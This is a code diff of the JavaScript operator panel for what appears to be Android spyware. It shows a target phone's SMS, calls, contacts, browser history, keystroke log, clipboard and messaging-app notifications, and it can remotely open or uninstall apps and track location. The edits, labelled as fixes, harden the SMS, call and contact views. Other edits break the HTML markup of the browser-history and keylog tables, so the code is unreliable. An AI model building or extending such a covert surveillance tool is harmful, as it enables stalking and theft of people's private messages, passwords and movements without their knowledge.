@@ -1173,13 +1173,13 @@ function renderMap(loc){
     });
 }
 
-// ==================== DATA DISPLAY FUNCTIONS (with MM:SS for call duration) ====================
+// ==================== DATA DISPLAY FUNCTIONS (FIXED: SMS, CALL LOGS, CONTACTS) ====================
 function renderTable(rows, headers) {
     const pageSize = 20;
     const totalPages = Math.ceil(rows.length / pageSize);
     const start = currentPage * pageSize;
     const pageRows = rows.slice(start, start + pageSize);
-    let html = '<div style="overflow-x:auto;"></table><thead><tr>';
+    let html = '<div style="overflow-x:auto;"><table><thead><tr>';
     headers.forEach(h => html += `<th>${h}</th>`);
     html += '</thead><tbody>';
     pageRows.forEach(r => {
@@ -1204,12 +1204,19 @@ window.gotoPage = function(p) {
     else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
     else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
 };
+
+// FIXED: displaySMS - ensures array and calls renderTable correctly
 function displaySMS(data) {
-    if (!Array.isArray(data) || data.length === 0) {
+    // Ensure data is an array (if string, try parse)
+    let smsArray = data;
+    if (typeof data === 'string') {
+        try { smsArray = JSON.parse(data); } catch(e) { smsArray = []; }
+    }
+    if (!Array.isArray(smsArray) || smsArray.length === 0) {
         panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>';
         return;
     }
-    const rows = data.map(m => [
+    const rows = smsArray.map(m => [
         m.type === 'inbox' || m.type === 1 ? '📥 Incoming' : '📤 Outgoing',
         m.address || m.number || '',
         m.body || '',
@@ -1219,12 +1226,18 @@ function displaySMS(data) {
     dataType = 'sms';
     renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
 }
+
+// FIXED: displayCallLogs - ensures array and uses MM:SS duration
 function displayCallLogs(data) {
-    if (!Array.isArray(data) || data.length === 0) {
+    let callArray = data;
+    if (typeof data === 'string') {
+        try { callArray = JSON.parse(data); } catch(e) { callArray = []; }
+    }
+    if (!Array.isArray(callArray) || callArray.length === 0) {
         panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
         return;
     }
-    const rows = data.map(c => [
+    const rows = callArray.map(c => [
         c.type || '',
         c.number || '',
         c.name || '',
@@ -1235,12 +1248,18 @@ function displayCallLogs(data) {
     dataType = 'call';
     renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
 }
+
+// FIXED: displayContacts - ensures array
 function displayContacts(data) {
-    if (!Array.isArray(data) || data.length === 0) {
+    let contactArray = data;
+    if (typeof data === 'string') {
+        try { contactArray = JSON.parse(data); } catch(e) { contactArray = []; }
+    }
+    if (!Array.isArray(contactArray) || contactArray.length === 0) {
         panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
         return;
     }
-    const rows = data.map(c => [
+    const rows = contactArray.map(c => [
         c.name || '',
         c.number || '',
         c.timesContacted || 0
@@ -1249,6 +1268,7 @@ function displayContacts(data) {
     dataType = 'contacts';
     renderTable(rows, ['Name', 'Number', 'Times Contacted']);
 }
+
 function displayWifiNetworks(data) {
     if (!Array.isArray(data) || data.length === 0) {
         panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
@@ -1263,31 +1283,37 @@ function displayWifiNetworks(data) {
     dataType = 'wifi';
     renderTable(rows, ['SSID', 'Signal', 'Status']);
 }
+
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
     panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
+
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></tr></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
+
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><tr><thead><tr><th>Time</th><th>App</th><th>Text</th></table></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
+
 function displayClipboard(data){
     const content=data&&data.content?data.content:(data||'');
     panel.innerHTML=`<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
 }
+
 function displaySocialMessages(data){
     let msgs=typeof data==='string'?JSON.parse(data):data;
     if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p><p><small>Note: Live chat content cannot be captured without root. Only notifications are recorded.</small></p>'; return; }
     panel.innerHTML=`<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg)||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`;
 }
 function getAppNameFromPkg(pkg){ const map={'com.whatsapp':'WhatsApp','org.telegram.messenger':'Telegram','com.instagram.android':'Instagram','com.facebook.orca':'Messenger','com.facebook.katana':'Facebook','com.snapchat.android':'Snapchat'}; return map[pkg]||pkg; }
+
 function showGeofencePanel(){
     if(!currentLocation){
         sendCommand('GET_LOCATION');
